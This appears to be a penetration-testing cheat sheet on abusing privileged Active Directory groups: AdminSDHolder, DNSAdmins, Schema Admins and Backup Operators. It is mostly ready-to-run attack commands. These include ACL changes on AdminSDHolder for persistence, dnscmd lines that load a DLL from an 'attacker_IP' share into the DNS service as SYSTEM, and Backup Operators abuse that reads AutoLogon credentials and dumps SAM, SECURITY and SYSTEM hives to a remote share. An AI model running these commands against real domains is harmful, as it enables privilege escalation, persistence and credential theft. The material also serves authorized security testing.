# Active Directory - Groups 

## Dangerous Built-in Groups Usage

If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object `CN=AdminSDHolder,CN=System` or set `"dminCount` attribute to `0` for the required object.

>  The AdminCount attribute is set to `1` automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).

Find users with `AdminCount=1`.

```ps1
netexec ldap 10.10.10.10 -u username -p password --admin-count
# or
bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get search --filter '(admincount=1)' --attr sAMAccountName
# or
python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.10.10.10
jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json
# or
Get-ADUser -LDAPFilter "(objectcategory=person)(samaccountname=*)(admincount=1)"
Get-ADGroup -LDAPFilter "(objectcategory=group) (admincount=1)"
# or
([adsisearcher]"(AdminCount=1)").findall()
```


## AdminSDHolder Attribute

> The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all "protected groups" in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.

If you modify the permissions of **AdminSDHolder**, that permission template will be pushed out to all protected accounts automatically by `SDProp` (in an hour).
E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.
* Windows/Linux:
  ```ps1
  bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 add genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john

  # Clean up after
  bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 remove genericAll 'CN=AdminSDHolder,CN=System,DC=example,DC=lab' john
  ```
* Windows only:
  ```ps1
  # Add a user to the AdminSDHolder group:
  Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity username -Rights All -Verbose

  # Right to reset password for toto using the account titi
  Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword

  # Give all rights
  Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName toto -Verbose -Rights All
  ```


## DNS Admins Group

> It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).

:warning: Require privileges to restart the DNS service.

* Enumerate members of DNSAdmins group
  * Windows/Linux:
    ```ps1
    bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object DNSAdmins --attr msds-memberTransitive
    ```
  * Windows only:
    ```ps1
    Get-NetGroupMember -GroupName "DNSAdmins"
    Get-ADGroupMember -Identity DNSAdmins
    ```
* Change dll loaded by the DNS service
    ```ps1
    # with RSAT
    dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
    dnscmd 10.10.10.11 /config /serverlevelplugindll \\10.10.10.10\exploit\privesc.dll

    # with DNSServer module
    $dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
    $dnsettings.ServerLevelPluginDll = "\attacker_IP\dll\mimilib.dll"
    Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
    ```
* Check the previous command success
    ```ps1
    Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll
    ```
* Restart DNS
    ```ps1
    sc \\dc01 stop dns
    sc \\dc01 start dns
    ```

## Schema Admins Group

> The Schema Admins group is a security group in Microsoft Active Directory that provides its members with the ability to make changes to the schema of an Active Directory forest. The schema defines the structure of the Active Directory database, including the attributes and object classes that are used to store information about users, groups, computers, and other objects in the directory.


## Backup Operators Group

> Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group cannot be renamed, deleted, or moved. By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers.

This groups grants the following privileges :
- SeBackup privileges
- SeRestore privileges

* Get members of the group:
  * Windows/Linux:
    ```ps1
    bloodyAD --host 10.10.10.10 -d example.lab -u john -p pass123 get object "Backup Operators" --attr msds-memberTransitive
    ```
  * Windows only:
    ```ps1
    PowerView> Get-NetGroupMember -Identity "Backup Operators" -Recurse
    ```
* Enable privileges using [giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege)
  ```ps1
  Import-Module .\SeBackupPrivilegeUtils.dll
  Import-Module .\SeBackupPrivilegeCmdLets.dll

  Set-SeBackupPrivilege
  Get-SeBackupPrivilege
  ```
* Retrieve sensitive files
  ```ps1
  Copy-FileSeBackupPrivilege C:\Users\Administrator\flag.txt C:\Users\Public\flag.txt -Overwrite
  ```
* Retrieve content of AutoLogon in the HKLM\SOFTWARE hive
  ```ps1
  $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
  $winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
  $winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
  ```
* Retrieve SAM,SECURITY and SYSTEM hives
  * [mpgn/BackupOperatorToDA](https://github.com/mpgn/BackupOperatorToDA): `.\BackupOperatorToDA.exe -t \\dc1.lab.local -u user -p pass -d domain -o \\10.10.10.10\SHARE\`
  * [improsec/BackupOperatorToolkit](https://github.com/improsec/BackupOperatorToolkit): `.\BackupOperatorToolkit.exe DUMP \\PATH\To\Dump \\TARGET.DOMAIN.DK`


## References

* [Poc’ing Beyond Domain Admin - Part 1 - cube0x0](https://cube0x0.github.io/Pocing-Beyond-DA/)
* [WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN](https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/)